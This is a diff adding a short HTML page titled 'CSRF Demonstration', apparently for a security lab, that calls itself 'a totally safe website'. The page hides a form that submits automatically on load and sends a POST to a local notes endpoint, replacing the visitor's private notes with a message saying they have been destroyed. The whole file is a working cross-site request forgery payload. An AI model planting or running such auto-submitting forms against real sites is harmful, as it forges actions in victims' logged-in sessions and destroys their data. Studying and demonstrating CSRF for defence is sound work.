@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>CSRF Demonstration</title>
+</head>
+<body>
+	<h1>CSRF Demonstration</h1>
+	<p>This is a totally safe website</p>
+<form id="attackform" action="http://localhost:8000/private_notes/" method="POST">
+	<input type="hidden" name="content" value="Your private notes have been destroyed!">
+</form>
+</body>
+<script>
+	document.getElementById("attackform").submit()
+</script>
+</html>
